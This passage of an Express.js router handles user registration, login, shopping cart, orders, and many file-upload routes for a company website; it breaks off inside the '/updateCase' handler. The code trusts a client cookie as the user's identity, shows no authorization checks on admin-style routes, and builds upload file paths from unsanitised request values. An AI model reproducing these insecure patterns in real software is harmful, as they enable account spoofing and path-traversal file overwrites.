var router = require('express').Router();
var request = require('request');

var config = require('../config/config');
var aotuConfig = config.wx_config.aotu;
var dbHandler = require('../lib/dbHandler');
var formidable = require('formidable'),
    fs = require('fs')
TITLE = 'formidable',
    QUESTION_UPLOAD_FOLDER = '/questions/',
    VIDEO_UPLOAD_FOLDER = '/video/',
    COMPANY_UPLOAD_FOLDER = '/company/',
    TRAINING_UPLOAD_FOLDER = '/training/',
    HOMEPAGE_UPLOAD_FOLDER = '/home/',
    SOFTWARE_UPLOAD_FOLDER = '/softwares/',
    INTEGRATOR_UPLOAD_FOLDER = '/integrator/',
    USER_UPLOAD_FOLDER = '/user/';

var util = require('../util/util');

router.get('/getUser', function (req, res, next) {
    if (req.cookies.user && req.cookies.user.email) {
        dbHandler.getUserInfo(req, res, (user) => {
            dbHandler.getShoppingCart(req, res, (data) => {
                res.send({ status: 'success', content: user.name, count: data.length })
            })
        })
    }
    else {
        res.send({ status: 'success', content: '' })
    }
})

router.post('/register', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        var tempstamp = new Date().getTime();
        var uid = `uid_${tempstamp}`;
        let user = { uid, inDate: new Date() };
        for (var obj in fields) {
            if (obj && obj != 'null') {
                user[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                if (key === 'businessLicense') {
                    var avatarName = uid + '_businessLicense' + '.' + extName;
                    var newPath = form.uploadDir + avatarName;
                }

                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        if (needChange) {
            dbHandler.createUser(user, req, res);
        }
        else {
            res.send({ status: 'failed' });
        }
    });
})

router.post('/update', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        if (!req.cookies.user) {
            res.send({ status: 'failed', msg: '账号不存在' })
            return;
        }
        var uid = req.cookies.user.uid;
        let user = { uid };
        for (var obj in fields) {
            if (obj && obj != 'null') {
                user[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                if (key === 'businessLicense') {
                    var avatarName = uid + '_businessLicense' + '.' + extName;
                    var newPath = form.uploadDir + avatarName;
                }
                else if (key === 'avator') {
                    var avatarName = uid + '_avator' + '.' + extName;
                    var newPath = form.uploadDir + avatarName;
                }

                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        if (needChange) {
            dbHandler.updateUser(user, req, res);
        }
        else {
            res.send({ status: 'failed' });
        }
    });
})

// router.get('/product', function (req, res, next) {
//     if (req.query.pid) {
//         dbHandler.getProduct(req, res, (data) => {
//             res.render('/product', { data })
//         })
//     }
//     else {
//         res.redirect('/')
//     }
// })

router.get('/list', function (req, res, next) {
    dbHandler.getList(req, res);
})

router.get('/promotions', function (req, res, next) {
    dbHandler.getPromotions(req, res);
})

router.get('/addToCart', function (req, res, next) {
    if (req.cookies && req.cookies.user) {
        dbHandler.addToCart(req, res);
        // let proudcts = {},
        // products.
        // dbHandler.getUserInfo(req, res, (user) => {
        //     res.render('myOrder', { title: '', user });
        // })
    }
    else {
        res.redirect('/login')
        // res.render('login', { title: '' });
    }
})

router.get('/createOrder', function (req, res, next) {
    if (req.cookies && req.cookies.user) {
        dbHandler.createOrder(req, res)
    }
    else {
        res.redirect('/login')
    }
})

router.post('/login', function (req, res, next) {
    if (req.body.email && req.body.email != '' && req.body.password && req.body.password != '') {
        dbHandler.login(req, res);
    }
    else {
        res.send({ status: 'failed', msg: '请输入账号和密码' })
    }
})

router.post('/addAddress', function (req, res, next) {
    if (req.body.address && req.body.name && req.body.phone) {
        dbHandler.addAddress(req, res)
    }
    else {
        res.send({ status: 'failed', msg: '请输入相关信息' })
    }
})

router.post('/addBill', function (req, res, next) {
    if (req.body.companyName && req.body.invoiceTaxNumber && req.body.name && req.body.phone) {
        dbHandler.addBill(req, res)
    }
    else {
        res.send({ status: 'failed', msg: '请输入相关信息' })
    }
})

router.post('/confirmOrder', function (req, res, next) {
    if (req.body.oid && req.cookies.user) {
        dbHandler.getUserInfo(req, res, (user) => {
            dbHandler.confirmOrder(req, res, user);
        })
    }
    else {
        res.send({ status: 'failed', msg: '请输入相关信息' })
    }
})

router.post('/uploadImages', function (req, res, next) {
    var pid = req.query.pid;
    var caseId = req.query.caseId;
    var ttid = req.query.ttid;
    var type = req.query.command;
    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        var tempstamp = new Date().getTime();
        var uid = `uid_${tempstamp}`;
        let user = { uid, inDate: new Date() };
        for (var obj in fields) {
            if (obj && obj != 'null') {
                user[obj] = fields[obj]
            }
        }

        var needChange = true;
        if (files && files.upload && files.upload.type) {
            var extName = '';  //后缀名
            switch (files.upload.type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files.upload.size == 0) {
                fs.unlinkSync(files.upload.path);
            }
            else {
                needChange = true;
                // if (key === 'description') {
                var avatarName = '';
                if (pid) {
                    avatarName = pid + '_' + type + '_' + new Date().getTime() + '.' + extName;
                }
                else if (caseId) {
                    avatarName = caseId + '_' + type + '_' + new Date().getTime() + '.' + extName;
                }
                else if (ttid) {
                    avatarName = ttid + '_' + type + '_' + new Date().getTime() + '.' + extName;
                }
                else {
                    avatarName = type + '_' + new Date().getTime() + '.' + extName;
                }
                // var avatarName = pid ? pid : caseId + '_' + type + '_' + new Date().getTime() + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                console.log(newPath);
                fs.renameSync(files.upload.path, newPath);  //重命名

            }
        }

        if (needChange) {
            res.end(JSON.stringify({ uploaded: true, url: '/company/' + avatarName }))
            // dbHandler.createUser(user, req, res);
        }
        else {
            res.send({ status: 'failed' });
        }
    });
})

router.post('/createProduct', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = { inDate: new Date() };
        product.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'application/pdf':
                    extName = 'pdf';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.pid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                product.imgs.push('/company/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        if (needChange) {
            dbHandler.createItem(req, res, product);
            // dbHandler.createUser(user, req, res);
        }
        else {
            res.send({ status: 'failed' });
        }
    });
})

router.post('/createCase', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = { inDate: new Date() };
        product.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.caseId + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                product.imgs.push('/company/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        if (needChange) {
            dbHandler.createCase(req, res, product);
            // dbHandler.createUser(user, req, res);
        }
        else {
            res.send({ status: 'failed' });
        }
    });
})

router.post('/createVideos', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + VIDEO_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = { inDate: new Date() };
        // product.video = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'video/mp4':
                    extName = 'mp4';
                    break;
                case 'video/avi':
                    extName = 'avi';
                    break;
                case 'video/mkv':
                    extName = 'mkv';
                    break;
                // case 'image/x-png':
                //     extName = 'jpg';
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.vid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                if (key == 'img') {
                    product.img = '/video/' + avatarName;
                }
                // else {
                //     product.video = '/video/' + avatarName;
                // }
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.createVideo(req, res, product);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: '请上传视频' });
        // }
    });
})

router.post('/createTraining', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + TRAINING_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var ttid = `ttid_${tempstamp}`;
        let product = { inDate: new Date() };
        product.img = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

        var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
                case 'video/mp4':
                    extName = 'mp4';
                    break;
                case 'video/avi':
                    extName = 'avi';
                    break;
                case 'video/mkv':
                    extName = 'mkv';
                    break;
                // case 'image/x-png':
                //     extName = 'jpg';
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = product.ttid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                product.img = '/training/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.createTraining(req, res, product);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: '请上传视频' });
        // }
    });
})


router.post('/createCustomQuestion', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + QUESTION_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let question = { inDate: new Date(), qid: `qid_${new Date().getTime()}` };
        question.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                question[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = question.qid + '_' + key + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                question.imgs.push('/questions/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.createCustomQuestion(req, res, question);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: 'try again later' });
        // }
    });
})
router.post('/createService', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + QUESTION_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        var tempstamp = new Date().getTime();
        var qid = `qid_${tempstamp}`;
        let common = { inDate: new Date(), qid };
        common.img = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                common[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = '';
                if (req.query.type == 0) {
                    avatarName = 'priceService' + '_' + qid + '_' + key + '_' + '.' + extName;
                }
                else if (req.query.type == 1) {
                    avatarName = 'suggestService' + '_' + qid + '_' + key + '_' + '.' + extName;
                }
                var newPath = form.uploadDir + avatarName;
                // }

                common.img = '/questions/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.createService(req, res, common, req.query.type == 0 ? 'priceService' : 'suggestService');
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: 'try again later' });
        // }
    });
})

router.post('/updateBanner', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + HOMEPAGE_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var qid = `qid_${tempstamp}`;
        let common = { inDate: new Date() };
        common.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                common[obj] = fields[obj]
            }
        }
        if (common.banners) {
            let banners = common.banners.split(',');
            banners.forEach((child) => {
                common.imgs.push('/home' + child.slice(child.lastIndexOf('/'), child.length));
            })
        }

        var needChange = false;
        if(common.imgs.length > 0){
            needChange = true;
        }
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                needChange = true;
                var avatarName = '';
                avatarName = key + '.' + extName;
                var newPath = form.uploadDir + avatarName;

                common.imgs.push('/home/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        if (needChange) {
            dbHandler.updateBanner(req, res, common)
        }
        else {
            res.send({ status: 'failed', msg: '请正确上传jpeg或者png的图片' });
        }
    });
})

router.post('/createIntegrator', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + INTEGRATOR_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let integrator = { inDate: new Date(), iid: `iid_${new Date().getTime()}` };
        integrator.imgs = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                integrator[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = integrator.iid + '_' + key + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                integrator.imgs = '/integrator/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }


        dbHandler.createIntegrator(req, res, integrator);
    });
})

router.post('/updateIntegrator', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + INTEGRATOR_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let integrator = {};
        for (var obj in fields) {
            if (obj && obj != 'null') {
                integrator[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = integrator.iid + '_' + key + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                integrator.imgs = '/integrator/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateIntegrator(req, res, integrator);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: 'try again later' });
        // }
    });
})

router.post('/updateWebsite', function (req, res, next) {
    // let a = '1';
    let collections = '';
    let query = { id: 1 }
    if (req.body.type == 0) {
        collections = 'support'
    }
    else if (req.body.type == 1) {
        collections = 'about'
    }
    else if (req.body.type == 2) {
        collections = 'contract'
    }
    else if (req.body.type == 3) {
        collections = 'guide'
        query = { id: 1 }
    }
    else if (req.body.type == 4) {
        collections = 'guide'
        query = { id: 2 }
    }
    else if (req.body.type == 5) {
        collections = 'guide'
        query = { id: 3 }
    }
    else if (req.body.type == 6) {
        collections = 'guide'
        query = { id: 4 }
    }
    else if (req.body.type == 7) {
        collections = 'guide'
        query = { id: 5 }
    }
    dbHandler.updateWebsite(req, res, collections, query);
    // var form = new formidable.IncomingForm();   //创建上传表单
    // form.encoding = 'utf-8';        //设置编辑
    // form.uploadDir = 'public' + INTEGRATOR_UPLOAD_FOLDER;     //设置上传目录
    // form.keepExtensions = true;     //保留后缀
    // form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    // form.parse(req, function (err, fields, files) {
    //     if (err) {
    //         res.send({ status: 'failed' });
    //         return;
    //     }
    //     // var tempstamp = new Date().getTime();
    //     // var uid = `uid_${tempstamp}`;
    //     let integrator = {};
    //     for (var obj in fields) {
    //         if (obj && obj != 'null') {
    //             integrator[obj] = fields[obj]
    //         }
    //     }

    //     // var needChange = true;
    //     for (var key in files) {
    //         var extName = '';  //后缀名
    //         switch (files[key].type) {
    //             case 'image/pjpeg':
    //                 extName = 'jpg';
    //                 break;
    //             case 'image/jpeg':
    //                 extName = 'jpg';
    //                 break;
    //             case 'image/png':
    //                 extName = 'jpg';
    //                 break;
    //             case 'image/x-png':
    //                 extName = 'jpg';
    //                 break;
    //         }
    //         if (files[key].size == 0) {
    //             fs.unlinkSync(files[key].path);
    //         }
    //         else {
    //             // needChange = true;
    //             // if (key === 'businessLicense') {
    //             var avatarName = integrator.iid + '_' + key + '.' + extName;
    //             var newPath = form.uploadDir + avatarName;
    //             // }

    //             integrator.imgs = '/integrator/' + avatarName;
    //             console.log(newPath);
    //             fs.renameSync(files[key].path, newPath);  //重命名

    //         }
    //     }

    //     // if (needChange) {
    //     dbHandler.updateIntegrator(req, res, integrator);
    //     // dbHandler.createUser(user, req, res);
    //     // }
    //     // else {
    //     //     res.send({ status: 'failed', msg: 'try again later' });
    //     // }
    // });
})


router.post('/updateCustomQuestion', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + QUESTION_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let question = { inDate: new Date(), };
        question.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                question[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = question.qid + '_' + key + '_' + new Date().getTime() + '_' + '.' + extName;
                var newPath = form.uploadDir + avatarName;
                // }

                question.imgs.push('/questions/' + avatarName);
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateCustomQuestion(req, res, question);
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: 'try again later' });
        // }
    });
})

router.post('/updateService', function (req, res, next) {

    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + QUESTION_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var qid = `qid_${tempstamp}`;
        let common = { inDate: new Date() };
        common.img = '';
        for (var obj in fields) {
            if (obj && obj != 'null') {
                common[obj] = fields[obj]
            }
        }

        // var needChange = true;
        for (var key in files) {
            var extName = '';  //后缀名
            switch (files[key].type) {
                case 'image/pjpeg':
                    extName = 'jpg';
                    break;
                case 'image/jpeg':
                    extName = 'jpg';
                    break;
                case 'image/png':
                    extName = 'jpg';
                    break;
                case 'image/x-png':
                    extName = 'jpg';
                    break;
            }
            if (files[key].size == 0) {
                fs.unlinkSync(files[key].path);
            }
            else {
                // needChange = true;
                // if (key === 'businessLicense') {
                var avatarName = '';
                if (req.query.type == 0) {
                    avatarName = 'priceService' + '_' + new Date().getTime() + '_' + key + '_' + '.' + extName;
                }
                else if (req.query.type == 1) {
                    avatarName = 'suggestService' + '_' + new Date().getTime() + '_' + key + '_' + '.' + extName;
                }
                var newPath = form.uploadDir + avatarName;
                // }

                common.img = '/questions/' + avatarName;
                console.log(newPath);
                fs.renameSync(files[key].path, newPath);  //重命名

            }
        }

        // if (needChange) {
        dbHandler.updateService(req, res, common, req.query.type == 0 ? 'priceService' : 'suggestService');
        // dbHandler.createUser(user, req, res);
        // }
        // else {
        //     res.send({ status: 'failed', msg: 'try again later' });
        // }
    });
})


router.post('/updateProduct', function (req, res, next) {
    if (req.query.pid && req.query.pid.trim() != '') {
        var form = new formidable.IncomingForm();   //创建上传表单
        form.encoding = 'utf-8';        //设置编辑
        form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
        form.keepExtensions = true;     //保留后缀
        form.maxFieldsSize = 2 * 1024 * 1024 * 1024;   //文件大小


        form.parse(req, function (err, fields, files) {
            if (err) {
                res.send({ status: 'failed' });
                return;
            }
            // var tempstamp = new Date().getTime();
            // var uid = `uid_${tempstamp}`;
            let product = {};
            product.imgs = [];
            for (var obj in fields) {
                if (obj && obj != 'null') {
                    product[obj] = fields[obj]
                }
            }

            // var needChange = true;
            for (var key in files) {
                var extName = '';  //后缀名
                switch (files[key].type) {
                    case 'image/pjpeg':
                        extName = 'jpg';
                        break;
                    case 'image/jpeg':
                        extName = 'jpg';
                        break;
                    case 'image/png':
                        extName = 'jpg';
                        break;
                    case 'image/x-png':
                        extName = 'jpg';
                        break;
                    case 'application/pdf':
                        extName = 'pdf';
                        break;
                }
                if (files[key].size == 0) {
                    fs.unlinkSync(files[key].path);
                }
                else {
                    // needChange = true;
                    // if (key === 'businessLicense') {
                    var avatarName = product.pid + '_' + key + '_' + '.' + extName;
                    var newPath = form.uploadDir + avatarName;
                    // }

                    product.imgs.push('/company/' + avatarName);
                    console.log(newPath);
                    fs.renameSync(files[key].path, newPath);  //重命名

                }
            }

            // if (needChange) {
            dbHandler.updateItem(req, res, product);
            // dbHandler.createUser(user, req, res);
            // }
            // else {
            //     res.send({ status: 'failed' });
            // }
        });
    }
    else {
        res.send({ status: 'failed', msg: 'try again later' });
    }
})

router.post('/updateCase', function (req, res, next) {
    // if (req.query.pid && req.query.pid.trim() != '') {
    var form = new formidable.IncomingForm();   //创建上传表单
    form.encoding = 'utf-8';        //设置编辑
    form.uploadDir = 'public' + COMPANY_UPLOAD_FOLDER;     //设置上传目录
    form.keepExtensions = true;     //保留后缀
    form.maxFieldsSize = 2 * 1024 * 1024;   //文件大小


    form.parse(req, function (err, fields, files) {
        if (err) {
            res.send({ status: 'failed' });
            return;
        }
        // var tempstamp = new Date().getTime();
        // var uid = `uid_${tempstamp}`;
        let product = {};
        product.imgs = [];
        for (var obj in fields) {
            if (obj && obj != 'null') {
                product[obj] = fields[obj]
            }
        }

